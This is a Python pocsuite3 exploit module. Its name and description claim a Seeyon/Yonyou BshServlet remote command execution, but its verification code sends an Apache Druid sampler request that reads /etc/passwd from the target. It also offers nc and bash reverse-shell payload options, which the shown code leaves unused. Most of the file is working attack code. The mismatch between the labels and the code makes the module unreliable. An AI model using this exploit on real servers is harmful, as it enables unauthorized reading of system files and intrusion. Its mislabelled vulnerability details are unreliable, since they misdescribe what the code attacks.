from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json
class DemoPOC(POCBase):
    vulID = '003'  # ssvid
    version = '1.0'
    name = 'Seeyon bsh.servlet.BshServlet RCE'
    appName = 'Seeyon'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json,text/plain,*/*"
            }
            json_data = {
        "type":"index",
        "spec":{
            "type":"index",
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"http",
                    "uris":[
                        "file:///etc/passwd"
                    ]
                },
                "inputFormat":{
                    "type":"regex",
                    "pattern":"(.*)",
                    "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns":[
                        "raw"
                    ]
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"!!!_no_such_column_!!!",
                    "missingValue":"1970-01-01T00:00:00Z"
                },
                "dimensionsSpec":{
                }
            },
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
        }
            target = self.url+"/druid/indexer/v1/sampler?for=connect"
            r = requests.post(url=target,headers=headers,json=json_data,timeout=10,verify=False,allow_redirects=False)
            if r.status_code == 200 and "root:x:0" in r.text:
                result['FileInfo'] = {}
                result['FileInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)